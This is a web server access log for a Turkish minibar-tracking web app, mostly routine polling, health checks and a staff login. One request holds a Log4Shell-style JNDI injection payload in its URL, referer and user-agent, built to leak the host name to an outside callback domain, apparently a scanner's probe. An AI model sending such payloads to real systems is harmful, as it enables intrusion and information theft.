178.240.236.6 - - [19/Mar/2026:14:17:29 +0300] "GET /static/js/oda_kontrol.js?v=1.1.87 HTTP/1.0" 200 0 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 2646
178.240.236.6 - - [19/Mar/2026:14:17:30 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 2016 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 10090
178.240.236.6 - - [19/Mar/2026:14:17:30 +0300] "GET /kat-odalari?kat_id=21 HTTP/1.0" 200 1624 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 35589
178.240.236.6 - - [19/Mar/2026:14:17:30 +0300] "GET /gorevler/api/bekleyen HTTP/1.0" 200 53 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 62722
178.240.236.6 - - [19/Mar/2026:14:17:30 +0300] "GET /api/kat-sorumlusu/bugun-eklemeler/1191 HTTP/1.0" 200 32 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 12274
178.240.236.6 - - [19/Mar/2026:14:17:31 +0300] "GET /api/kat-sorumlusu/oda-setup/1191 HTTP/1.0" 200 7378 "https://minibartakip.com/kat-sorumlusu/oda-kontrol?kat_id=21&oda_id=1191&from_kat_detay=1" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 126386
127.0.0.1 - - [19/Mar/2026:14:17:33 +0300] "GET /health HTTP/1.1" 200 244 "-" "curl/8.14.1" 4281
185.67.34.141 - - [19/Mar/2026:14:17:34 +0300] "GET / HTTP/1.0" 302 199 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15" 5626
88.231.129.62 - - [19/Mar/2026:14:17:35 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2433
88.231.129.62 - - [19/Mar/2026:14:17:35 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4931 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3015
88.231.129.62 - - [19/Mar/2026:14:17:35 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 25733
88.231.129.62 - - [19/Mar/2026:14:17:36 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 659596
88.231.129.62 - - [19/Mar/2026:14:17:45 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4815
88.231.129.62 - - [19/Mar/2026:14:17:45 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4930 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4823
88.231.129.62 - - [19/Mar/2026:14:17:45 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 25406
88.231.129.62 - - [19/Mar/2026:14:17:46 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 534160
74.7.244.11 - - [19/Mar/2026:14:17:53 +0300] "GET /robots.txt HTTP/1.0" 404 73897 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36; compatible; OAI-SearchBot/1.3; robots.txt; +https://openai.com/searchbot" 6832
88.231.129.62 - - [19/Mar/2026:14:17:55 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4931 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3017
88.231.129.62 - - [19/Mar/2026:14:17:55 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5987
88.231.129.62 - - [19/Mar/2026:14:17:55 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 25109
88.231.129.62 - - [19/Mar/2026:14:17:56 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 514415
127.0.0.1 - - [19/Mar/2026:14:18:04 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4358
88.231.129.62 - - [19/Mar/2026:14:18:05 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4930 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5482
88.231.129.62 - - [19/Mar/2026:14:18:05 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3146
88.231.129.62 - - [19/Mar/2026:14:18:05 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 118608
88.231.129.62 - - [19/Mar/2026:14:18:06 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 511878
178.240.236.6 - - [19/Mar/2026:14:18:30 +0300] "GET /gorevler/api/bekleyen HTTP/1.0" 200 53 "https://minibartakip.com/kat-sorumlusu/oda-kontrol" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36" 25353
127.0.0.1 - - [19/Mar/2026:14:18:34 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4316
88.231.129.62 - - [19/Mar/2026:14:18:38 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4916 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4044
88.231.129.62 - - [19/Mar/2026:14:18:38 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 1693
88.231.129.62 - - [19/Mar/2026:14:18:38 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 26802
88.231.129.62 - - [19/Mar/2026:14:18:39 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 515818
88.231.129.62 - - [19/Mar/2026:14:18:51 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4933 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4136
88.231.129.62 - - [19/Mar/2026:14:18:51 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2945
88.231.129.62 - - [19/Mar/2026:14:18:51 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 28277
88.231.129.62 - - [19/Mar/2026:14:18:52 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 510302
185.67.34.141 - - [19/Mar/2026:14:18:53 +0300] "GET /?x=${jndi:ldap://127.0.0.1 HTTP/1.0" 302 199 "${jndi:ldap://127.0.0.1#.${hostName}.referer.d6ttn6he89sa1u814m5gncwz7dwqbzdw8.kontrol.usom.gov.tr}" "${jndi:ldap://127.0.0.1#.${hostName}.useragent.d6ttn6he89sa1u814m5g6kqx6h4w74i7r.kontrol.usom.gov.tr}" 5437
88.231.129.62 - - [19/Mar/2026:14:18:55 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5372
88.231.129.62 - - [19/Mar/2026:14:18:55 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4912 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3419
88.231.129.62 - - [19/Mar/2026:14:18:55 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 154042
88.231.129.62 - - [19/Mar/2026:14:18:55 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508860
127.0.0.1 - - [19/Mar/2026:14:19:04 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4400
88.231.129.62 - - [19/Mar/2026:14:19:05 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4932 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5512
88.231.129.62 - - [19/Mar/2026:14:19:05 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4344
88.231.129.62 - - [19/Mar/2026:14:19:05 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 25113
88.231.129.62 - - [19/Mar/2026:14:19:06 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 452 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508039
88.231.129.62 - - [19/Mar/2026:14:19:15 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4932 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2563
88.231.129.62 - - [19/Mar/2026:14:19:15 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5533
88.231.129.62 - - [19/Mar/2026:14:19:15 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 105298
88.231.129.62 - - [19/Mar/2026:14:19:16 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 532210
88.231.129.62 - - [19/Mar/2026:14:19:25 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4933 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4833
88.231.129.62 - - [19/Mar/2026:14:19:25 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3074
88.231.129.62 - - [19/Mar/2026:14:19:25 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 26764
88.231.129.62 - - [19/Mar/2026:14:19:26 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508923
127.0.0.1 - - [19/Mar/2026:14:19:34 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4368
88.231.129.62 - - [19/Mar/2026:14:19:35 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 2148
88.231.129.62 - - [19/Mar/2026:14:19:35 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4915 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3805
88.231.129.62 - - [19/Mar/2026:14:19:35 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 130683
88.231.129.62 - - [19/Mar/2026:14:19:36 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508642
88.231.129.62 - - [19/Mar/2026:14:19:46 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4915 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 5396
88.231.129.62 - - [19/Mar/2026:14:19:46 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 1981
88.231.129.62 - - [19/Mar/2026:14:19:46 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 28488
88.231.129.62 - - [19/Mar/2026:14:19:46 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 508234
88.231.129.62 - - [19/Mar/2026:14:19:55 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 3543
88.231.129.62 - - [19/Mar/2026:14:19:55 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4933 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4167
88.231.129.62 - - [19/Mar/2026:14:19:55 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 26574
88.231.129.62 - - [19/Mar/2026:14:19:56 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 454 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 518766
127.0.0.1 - - [19/Mar/2026:14:20:04 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 6101
94.79.94.69 - - [19/Mar/2026:14:20:12 +0300] "GET / HTTP/1.0" 302 199 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 5219
94.79.94.69 - - [19/Mar/2026:14:20:12 +0300] "GET /login HTTP/1.0" 200 13360 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 10327
94.79.94.69 - - [19/Mar/2026:14:20:12 +0300] "GET /static/js/toast.js HTTP/1.0" 304 0 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2438
94.79.94.69 - - [19/Mar/2026:14:20:12 +0300] "GET /static/js/form-validation.js HTTP/1.0" 304 0 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 1864
94.79.94.69 - - [19/Mar/2026:14:20:13 +0300] "GET /static/js/browser@4.js HTTP/1.0" 304 0 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2236
94.79.94.69 - - [19/Mar/2026:14:20:21 +0300] "POST /login HTTP/1.0" 302 207 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 243270
94.79.94.69 - - [19/Mar/2026:14:20:21 +0300] "GET /dashboard HTTP/1.0" 302 235 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2288
94.79.94.69 - - [19/Mar/2026:14:20:30 +0300] "GET /kat-sorumlusu/dashboard HTTP/1.0" 200 143582 "https://minibartakip.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 9606996
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/theme.js HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2421
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/tema_modal.js HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2255
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/manifest.json HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2562
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/css/tailwind.min.css HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 1928
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/css/tablet-touch.css HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2413
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/table-search-filter.js HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 5218
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/gorev_oncelik.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 4637
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/guide-system.js?v=1.1.87 HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 4458
94.79.94.69 - - [19/Mar/2026:14:20:31 +0300] "GET /static/js/bildirim_manager.js HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 3945
94.79.94.69 - - [19/Mar/2026:14:20:32 +0300] "GET /static/js/pwa-install.js HTTP/1.0" 304 0 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 2239
94.79.94.69 - - [19/Mar/2026:14:20:32 +0300] "GET /api/dolum-talepleri HTTP/1.0" 200 41 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 5499
94.79.94.69 - - [19/Mar/2026:14:20:32 +0300] "GET /gorevler/api/bekleyen HTTP/1.0" 200 53 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 347408
94.79.94.69 - - [19/Mar/2026:14:20:32 +0300] "GET /api/bildirimler?limit=20 HTTP/1.0" 200 2016 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 422375
127.0.0.1 - - [19/Mar/2026:14:20:34 +0300] "GET /health HTTP/1.1" 200 243 "-" "curl/8.14.1" 4267
88.231.129.62 - - [19/Mar/2026:14:20:38 +0300] "GET /api/system-monitor/endpoints?sort=avg_time HTTP/1.0" 200 4929 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 4624
88.231.129.62 - - [19/Mar/2026:14:20:39 +0300] "GET /api/system-monitor/db-stats HTTP/1.0" 200 771 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 566521
88.231.129.62 - - [19/Mar/2026:14:20:39 +0300] "GET /api/system-monitor/error-log?limit=50 HTTP/1.0" 200 37 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 23806
88.231.129.62 - - [19/Mar/2026:14:20:40 +0300] "GET /api/system-monitor/overview HTTP/1.0" 200 453 "https://minibartakip.com/system-monitor" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36" 1650165
94.79.94.69 - - [19/Mar/2026:14:20:42 +0300] "GET /kat-doluluk/21 HTTP/1.0" 200 202360 "https://minibartakip.com/kat-sorumlusu/dashboard" "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1" 4967401
